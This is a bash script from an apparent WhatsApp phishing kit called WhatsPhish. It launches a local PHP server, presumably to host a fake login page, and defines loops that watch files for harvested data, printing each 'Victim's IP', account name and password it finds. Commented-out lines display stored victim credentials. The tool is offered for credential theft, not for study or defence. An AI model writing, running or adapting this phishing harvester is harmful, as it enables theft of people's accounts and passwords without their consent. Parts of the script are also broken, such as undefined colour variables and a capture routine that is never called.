#!/bin/bash

clear

sleep 0.2
cat .banner.txt | lolcat
echo -e	'							\e[1;33mAutor: \e[1;32mCharly\e[1;37mDev\e[1;31m777'

echo ''
echo ''
sleep 0.7
echo -e '\e[1;32m[\e[1;31m+\e[1;32m] \e[1;36mInicializando servidor PHP...'
sleep 0.9
echo -e '\e[1;32m[\e[1;31m+\e[1;32m] \e[1;36mServidor PHP iniciado... \e[1;31mpara detener use \e[1;37mCTRL + C\e[0;32m'

Host='127.0.0.1'
Port='8080'
#php -S "$Host":"$Port" > /dev/null 2>&1 &
php -S "$Host":"$Port"
echo ""
echo ""
echo ""


capture_ip() {
        IP=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
        IFS=$'\n'
        echo -e "\e[1;32m[\e[1;31m+\e[1;32m]  \e[1;36mVictim's IP : \e[1;32m$IP"
        echo -ne "\e[1;34mSaved in : \e[1;31ip.txt"
}

capture_creds() {
        ACCOUNT=$(grep -o 'Username:.*' usernames.txt | awk '{print $2}')
        PASSWORD=$(grep -o 'Pass:.*' usernames.txt | awk '{print $2}')
        IFS=$'\n'
        echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Account : ${BLUE}$ACCOUNT"
        echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Password : ${BLUE}$PASSWORD"
        echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}auth/usernames.dat"


}

capture_data() {
        echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Login Info, ${BLUE}Ctrl + C ${ORANGE}"
        while true; do
                if [[ -e "ip.txt" ]]; then
                        echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Victim IP Found !"
                        capture_ip

                fi
                sleep 0.75
                if [[ -e "usernames.txt" ]]; then
                        echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Login info Found !!"
                        capture_creds

                fi
                sleep 0.75
        done
}

#sleep 0.5
#echo -e '\e[1;32m[\e[1;31m+\e[1;32m] \e[1;36mInformacion de la victima\e[1;37m'
#cat $HOME/WhatsPhish/www/ip.txt
#echo ""

#sleep 0.8
#echo ""
#echo -e '\e[1;32m[\e[1;31m+\e[1;32m] \e[1;36mCredenciales de las victimas\e[1;37m' 
#echo ""
#cat $HOME/WhatsPhish/www/Credenciales.txt
#echo ""

sleep 0.4

#==================================================
#           Created by: @CharlyDev777
#==================================================
